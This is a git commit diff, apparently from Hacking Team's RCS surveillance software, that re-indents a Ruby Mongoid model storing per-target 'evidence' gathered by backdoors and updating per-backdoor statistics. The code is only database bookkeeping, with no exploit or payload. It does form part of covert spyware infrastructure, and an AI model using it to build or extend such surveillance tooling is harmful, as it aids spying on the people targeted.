3bb0cfb55d61219912babcfedcbed8642cab843f
daniele <d.milan@hackingteam.it>
2011-06-15 10:33:30 +0200

    Indentation fix.

--- lib/rcs-db/db_objects/evidence.rb
+++ lib/rcs-db/db_objects/evidence.rb
@@ -11,49 +11,49 @@ class Evidence
 
   def self.collection_class(target)
 
-classDefinition = <<END
-  class Evidence_#{target}
-    include Mongoid::Document
+    classDefinition = <<-END
+      class Evidence_#{target}
+        include Mongoid::Document
 
-    field :acquired, type: Integer
-    field :received, type: Integer
-    field :type, type: String
-    field :relevance, type: Integer
-    field :blotter, type: Boolean
-    field :item, type: Array         # backdoor BSON_ID
-    field :data, type: Hash
-    
-    store_in Evidence.collection_name('#{target}')
-    
-    after_create :create_callback
-    after_destroy :destroy_callback
+        field :acquired, type: Integer
+        field :received, type: Integer
+        field :type, type: String
+        field :relevance, type: Integer
+        field :blotter, type: Boolean
+        field :item, type: Array         # backdoor BSON_ID
+        field :data, type: Hash
 
-    STAT_EXCLUSION = ['info', 'filesystem']
+        store_in Evidence.collection_name('#{target}')
 
-    protected
-    def create_callback
-      return if STAT_EXCLUSION.include? self.type
-      backdoor = Item.find self.item.first
-      backdoor.stat.evidence ||= {}
-      backdoor.stat.evidence[self.type] ||= 0
-      backdoor.stat.evidence[self.type] += 1
-      backdoor.stat.size += self.data[:_grid_size]
-      backdoor.stat.size += Mongoid.database.collection("#{Evidence.collection_name(target)}").stats()['avgObjSize'].to_i
-      backdoor.save
-    end
-    
-    def destroy_callback
-      return if STAT_EXCLUSION.include? self.type
-      backdoor = Item.find self.item.first
-      backdoor.stat.evidence ||= {}
-      backdoor.stat.evidence[self.type] ||= 0
-      backdoor.stat.evidence[self.type] -= 1
-      backdoor.stat.size -= self.data[:_grid_size]
-      backdoor.stat.size -= Mongoid.database.collection("#{Evidence.collection_name(target)}").stats()['avgObjSize'].to_i
-      backdoor.save
-    end
-  end
-END
+        after_create :create_callback
+        after_destroy :destroy_callback
+
+        STAT_EXCLUSION = ['info', 'filesystem']
+
+        protected
+        def create_callback
+          return if STAT_EXCLUSION.include? self.type
+          backdoor = Item.find self.item.first
+          backdoor.stat.evidence ||= {}
+          backdoor.stat.evidence[self.type] ||= 0
+          backdoor.stat.evidence[self.type] += 1
+          backdoor.stat.size += self.data[:_grid_size]
+          backdoor.stat.size += Mongoid.database.collection("#{Evidence.collection_name(target)}").stats()['avgObjSize'].to_i
+          backdoor.save
+        end
+
+        def destroy_callback
+          return if STAT_EXCLUSION.include? self.type
+          backdoor = Item.find self.item.first
+          backdoor.stat.evidence ||= {}
+          backdoor.stat.evidence[self.type] ||= 0
+          backdoor.stat.evidence[self.type] -= 1
+          backdoor.stat.size -= self.data[:_grid_size]
+          backdoor.stat.size -= Mongoid.database.collection("#{Evidence.collection_name(target)}").stats()['avgObjSize'].to_i
+          backdoor.save
+        end
+      end
+    END
     
     classname = "Evidence_#{target}"
     
